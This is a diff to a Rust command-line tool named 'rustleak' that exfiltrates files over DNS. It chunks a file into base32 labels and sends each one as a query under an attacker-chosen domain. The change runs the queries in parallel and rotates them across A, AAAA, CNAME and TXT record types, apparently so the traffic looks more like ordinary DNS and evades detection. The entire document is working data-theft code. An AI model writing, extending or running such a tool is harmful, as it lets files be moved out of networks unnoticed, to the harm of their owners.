@@ -1,4 +1,5 @@
 use clap::{Parser, Subcommand};
+use futures::future::join_all;
 use std::fs;
 use log::{error, info};
 use simple_logger::SimpleLogger;
@@ -7,7 +8,8 @@ use rustleak_lib::{
     utils::{decode_base32, encode_base32, split_data_into_label_chunks},
 };
 use std::time::Instant;
-
+use rand::distributions::{Distribution, WeightedIndex};
+use rand::thread_rng;
 const MAX_ATTEMPTS: usize = 10;
 
 #[derive(Parser, Debug)]
@@ -54,50 +56,49 @@ async fn main() {
     match args.command {
         Commands::Send { code, filename, domain } => {
             match fs::read(&filename) {
-                Ok(raw_bytes) => {
-                    info!("File {} exists and is readable", &filename);
-                    let labels = split_data_into_label_chunks(&raw_bytes);
-                    let encoded_labels = encode_base32(labels);
-                    let total_labels = encoded_labels.len();
-                
-                    let start_time = Instant::now();
-                    for (i, label) in encoded_labels.iter().enumerate() {
-                        let mut attempts = 0;
-                        loop {
-                            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
-                            let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, i, total_labels, code, domain);
-                
-                            match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::TXT).await {
-                                Ok(_) => break,
-                                Err(_) => {
-                                    attempts += 1;
-                                    if attempts >= MAX_ATTEMPTS {
-                                        error!("Failed to send query after {} attempts: {}", MAX_ATTEMPTS, query);
-                                        error!("Aborting...");
-                                        std::process::exit(1);
-                                    }
-                                }
-                            }
+            Ok(raw_bytes) => {
+                info!("File {} exists and is readable", &filename);
+                let labels = split_data_into_label_chunks(&raw_bytes);
+                let encoded_labels = encode_base32(labels);
+                let total_labels = encoded_labels.len();
+            
+                let start_time = Instant::now();
+                let futures: Vec<_> = encoded_labels.iter().enumerate().map(|(i, label)| {
+                let resolver = resolver.clone();
+                let code = code.clone();
+                let domain = domain.clone();
+                async move {
+                    let mut attempts = 0;
+                    loop {
+                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+                    let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, i, total_labels, code, domain);
+            
+                    match resolver.lookup(&query, get_random_record_type()).await {
+                        Ok(_) => break,
+                        Err(_) => {
+                        attempts += 1;
+                        if attempts >= MAX_ATTEMPTS {
+                            error!("Failed to send query after {} attempts: {}", MAX_ATTEMPTS, query);
+                            error!("Aborting...");
+                            std::process::exit(1);
                         }
-
-                        let progress = (i + 1) as f32 / total_labels as f32 * 100.0;
-                        let elapsed = start_time.elapsed().as_secs_f32();
-                        let estimated_total = elapsed / ((i + 1) as f32 / total_labels as f32);
-                        let remaining = estimated_total - elapsed;
-                        info!(
-                            "Progress: {:.1}% - Elapsed: {:.1}s - Remaining: {:.1}s",
-                            progress, elapsed, remaining
-                        );
+                        }
                     }
-                    let elapsed = start_time.elapsed().as_secs_f32();
-                    let byte_rate = (raw_bytes.len() as f32) / elapsed;
-                    info!("Data sent successfully!");
-                    info!("Average byte rate: {:.1} bytes/s", byte_rate);
+                    }
                 }
-                Err(e) => {
-                    error!("Error reading file: {}", e);
-                    return;
-                }
+                }).collect();
+
+                join_all(futures).await;
+
+                let elapsed = start_time.elapsed().as_secs_f32();
+                let byte_rate = (raw_bytes.len() as f32) / elapsed;
+                info!("Data sent successfully!");
+                info!("Average byte rate: {:.1} bytes/s", byte_rate);
+            }
+            Err(e) => {
+                error!("Error reading file: {}", e);
+                return;
+            }
             };
         }
         Commands::Receive { code, filename, domain } => {
@@ -177,4 +178,19 @@ async fn main() {
             info!("Average byte rate: {:.1} bytes/s", byte_rate);
         }
     }
+}
+
+fn get_random_record_type() -> hickory_resolver::proto::rr::RecordType {
+    let record_types = vec![
+        hickory_resolver::proto::rr::RecordType::A,
+        hickory_resolver::proto::rr::RecordType::AAAA,
+        hickory_resolver::proto::rr::RecordType::CNAME,
+        hickory_resolver::proto::rr::RecordType::TXT,
+    ];
+
+    let weights = vec![30, 30, 30, 10];
+    let dist = WeightedIndex::new(&weights).unwrap();
+    let mut rng = thread_rng();
+    record_types[dist.sample(&mut rng)]
+    
 }
